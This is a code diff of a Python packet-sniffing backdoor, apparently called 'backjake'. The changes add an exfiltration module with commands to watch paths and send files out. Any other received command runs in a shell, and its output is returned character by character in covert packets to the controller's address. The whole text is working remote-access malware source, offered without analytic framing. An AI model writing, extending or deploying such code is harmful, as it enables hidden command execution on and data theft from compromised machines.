@@ -9,6 +9,7 @@ import pcapy
 import config
 import backjake
 import utils
+import exfil
 
 command = ""
 pswd = utils.encrypt(config.password)
@@ -66,26 +67,21 @@ def checkCommand(ip, proto, data, pacType):
 			command = ""
 
 def executeCommand(srcAddress, pacType, command):
-	# check if command is within the backdoor
-	# otherwise, exec it
-	# clear command at the end
 	if command == "?exit" or command == "?quit":
 		thread.interrupt_main()
-	elif command == "?file":
-		print "file stuff"
+	elif "?intfA " in command:
+		exfil.addWatch(command[7:])
+	elif "?intfD " in command:
+		exfil.removeWatch(command[7:])
+	elif "?file " in command:
+		exfil.sendFile(command[6:])
 	else:
 		sendThread = threading.Thread(target=sendResults, args=(srcAddress,pacType,command))
 		sendThread.start()
-
-	# directory = os.system("pwd")
-	# results = os.system(command)
-	# shell = str(directory) + " > " + str(results)
-	# print shell -> send results back to client
 
 def sendResults(address, protocol, comm):
 	results = subprocess.Popen(comm, shell=True, stdout=PIPE).stdout.read()
 	
 	# encrypt results 
-	# for each character, send a packet to address
 	for c in results:
 		send(utils.covertPacket(address, protocol, c, pswd), verbose=0)
